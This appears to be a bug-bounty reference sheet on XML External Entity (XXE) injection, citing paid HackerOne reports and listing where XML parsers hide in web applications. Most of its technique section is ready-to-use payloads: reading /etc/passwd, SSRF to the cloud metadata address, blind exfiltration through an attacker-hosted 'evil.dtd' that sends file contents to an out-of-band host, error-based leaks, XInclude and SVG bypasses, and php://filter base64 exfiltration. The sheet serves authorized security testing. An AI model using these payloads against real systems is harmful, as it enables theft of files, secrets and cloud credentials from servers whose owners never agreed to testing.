# XXE — XML External Entity Injection (deep)

Any XML the server parses with external entities enabled → file read, SSRF, sometimes RCE. Paid patterns
(H1): Mail.ru *blind XXE on pulse.mail.ru* **$6k**; Pornhub *multiple XXE endpoints* **$2.5k**; plus
disclosed *XXE via SVG upload → SSRF* (Zivver), *XXE via JPEG XMP metadata* (Informatica), *unserialize →
XXE file disclosure* (Pornhub), *XXE → RCE* (US DoD), Starbucks `.aspx` dynamic page, Twitter SXMP processor.

## Where it lives
- **Any XML intake:** SOAP/REST XML bodies, XML-RPC, `Content-Type: application/xml` or `text/xml`.
- **Uploads that are secretly XML:** SVG, DOCX/XLSX/PPTX (`word/document.xml`), **JPEG/TIFF XMP metadata**,
  vCard, RSS/Atom, GPX/KML, SAML responses, XML sitemaps, config/import files.
- **Custom processors:** SXMP/message processors, `.aspx` dynamic pages, PDF/e-signature pipelines.
Tell: the endpoint accepts XML, or a "harmless" upload is parsed as XML server-side.

## Techniques (escalate through these)
```xml
<!-- 1. Classic in-band file read -->
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<r>&xxe;</r>

<!-- 2. SSRF via XXE (reach cloud metadata / internal) -->
<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&xxe;</r>

<!-- 3. Blind / OOB exfil via external DTD (when no output) — Mail.ru $6k pattern -->
<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://OOB/evil.dtd"> %ext;]><r>&send;</r>
<!-- evil.dtd hosted by you: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://OOB/?x=%file;'>">
%eval; %send;

<!-- 4. Error-based (leak file content in a parse error) when outbound is blocked -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">%eval;%err;

<!-- 5. Local-DTD reuse (outbound + custom DTD both blocked): reuse an on-disk DTD to redefine an entity -->
```

## Filter / hardened-parser bypasses
- **DOCTYPE blocked → XInclude:** `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include
  parse="text" href="file:///etc/passwd"/></foo>`.
- **UTF-16 / UTF-7 / EBCDIC** re-encode the payload to dodge string filters.
- **PHP wrapper amplification:** `php://filter/convert.base64-encode/resource=…` to exfil binary/large files.
- **SVG upload path** (image parsers): `<svg><image href="file:///etc/passwd"/></svg>` or a DOCTYPE in the SVG.

## Proof-of-impact bar
Read a **real** sensitive file (`/etc/passwd`, app config, `.env`, cloud creds), or return internal
content via SSRF. A DTD parse error alone or billion-laughs DoS alone is usually N/A. File read = High;
XXE→SSRF→cloud-cred or →RCE = Critical. Blind is fine **if** you prove exfil through the OOB channel.
